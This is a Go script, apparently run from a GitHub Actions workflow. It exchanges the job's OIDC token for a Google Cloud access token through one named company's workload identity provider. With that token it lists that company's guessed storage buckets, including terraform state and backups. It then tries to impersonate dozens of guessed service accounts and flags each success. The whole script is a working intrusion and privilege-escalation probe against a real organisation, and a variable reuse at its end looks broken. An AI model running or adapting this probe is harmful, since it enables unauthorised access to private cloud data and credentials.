package main

// WIF breadth probe round 2 (intent 40228): resource-level (buckets) + extra SA names.
// READ-ONLY. No data modification, no writes.

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const provider = "//iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider"

var client = &http.Client{Timeout: 45 * time.Second}

func decodePayload(jwt string) string {
	p := strings.Split(jwt, ".")
	if len(p) != 3 {
		return "decode-failed"
	}
	b, err := base64.RawURLEncoding.DecodeString(p[1])
	if err != nil {
		return "decode-failed"
	}
	return string(b)
}

func httpDo(method, u, bearer string, body []byte) (int, string) {
	var rdr io.Reader
	if body != nil {
		rdr = bytes.NewReader(body)
	}
	req, _ := http.NewRequest(method, u, rdr)
	if bearer != "" {
		req.Header.Set("Authorization", "Bearer "+bearer)
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "do-error:" + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(b)
}

func trim(s string, n int) string {
	s = strings.ReplaceAll(s, "\n", " ")
	if len(s) > n {
		return s[:n]
	}
	return s
}

func main() {
	fmt.Println("=== WIF-BREADTH PROBE2 START ===")
	reqURL := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	reqTok := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	if reqURL == "" {
		fmt.Println("no token url")
		return
	}
	u := reqURL + "&audience=" + url.QueryEscape(provider)
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("Authorization", "bearer "+reqTok)
	req.Header.Set("Accept", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("oidc err", err)
		return
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	var oidc struct{ Value string `json:"value"` }
	json.Unmarshal(b, &oidc)
	if oidc.Value == "" {
		fmt.Println("no jwt")
		return
	}
	sbody, _ := json.Marshal(map[string]string{
		"audience": provider, "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
		"requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
		"scope":              "https://www.googleapis.com/auth/cloud-platform",
		"subjectTokenType":   "urn:ietf:params:oauth:token-type:jwt",
		"subjectToken":       oidc.Value,
	})
	st, sb := httpDo("POST", "https://sts.googleapis.com/v1/token", "", sbody)
	var tok struct{ AccessToken string `json:"access_token"` }
	json.Unmarshal([]byte(sb), &tok)
	fmt.Println("STS_STATUS:", st, "got_token:", tok.AccessToken != "")
	ft := tok.AccessToken
	if ft == "" {
		fmt.Println("STS_BODY:", trim(sb, 300))
		return
	}

	// --- known Recurly buckets: read-only metadata + object list ---
	buckets := []string{
		"recurly-terraform-state", "dps-docs", "dps-docs.recurly.net",
		"platform-data-prod", "platform-data-stage", "platform-data-dev",
		"recurly-terraform-state-prod", "recurly-backups", "recurly-prod-backups",
		"recurly-artifacts", "recurly-builds", "recurly-ci",
	}
	for _, bk := range buckets {
		s1, b1 := httpDo("GET", "https://storage.googleapis.com/storage/v1/b/"+url.PathEscape(bk), ft, nil)
		s2, b2 := httpDo("GET", "https://storage.googleapis.com/storage/v1/b/"+url.PathEscape(bk)+"/o?maxResults=2", ft, nil)
		fmt.Printf("BUCKET[%s] meta=%d list=%d %s | %s\n", bk, s1, s2, trim(b1, 120), trim(b2, 160))
	}

	// --- extra SA names ---
	extra := map[string][]string{
		"devops-f467c7d5":         {"recurly-dbt", "github-actions-prod", "cicd", "service", "bot", "automation", "pipeline", "gcs-sync-prod", "dps", "analytics", "firebase-adminsdk", "cloud-build-deploy", "gbp", "recurly"},
		"production-1-3d0475e1":   {"dataform", "bigquery", "composer", "dataproc", "gke", "k8s", "storage", "recurly-dbt", "analytics", "firebase-adminsdk", "cloud-functions", "recurly", "dps-docs", "vertex-ai", "aiplatform"},
		"recurly-corporate-ai":    {"vertex", "aiplatform", "vertex-ai", "adk", "agent", "gemini", "bigquery", "dataform", "cloud-functions"},
	}
	for p, locs := range extra {
		for _, loc := range locs {
			email := loc + "@" + p + ".iam.gserviceaccount.com"
			u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + url.PathEscape(email) + ":generateAccessToken"
			bd, _ := json.Marshal(map[string]interface{}{"scope": []string{"https://www.googleapis.com/auth/cloud-platform"}, "lifetime": "300s"})
			s, sb := httpDo("POST", u, ft, bd)
			mark := ""
			if s == 200 {
				mark = " <<< SUCCESS"
			}
			fmt.Printf("GENAT2[%s]: %d %s%s\n", email, s, trim(sb, 140), mark)
		}
	}

	// --- project by number ---
	s, sb = httpDo("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/597679076120", ft, nil)
	fmt.Printf("CRM_PROJECT_BYNUMBER[597679076120]: %d %s\n", s, trim(sb, 300))
	s, sb = httpDo("GET", "https://cloudresourcemanager.googleapis.com/v1/projects?filter=id:production-1-3d0475e1", ft, nil)
	fmt.Printf("CRM_SEARCH_PROD: %d %s\n", s, trim(sb, 300))

	fmt.Println("=== WIF-BREADTH PROBE2 END ===")
}
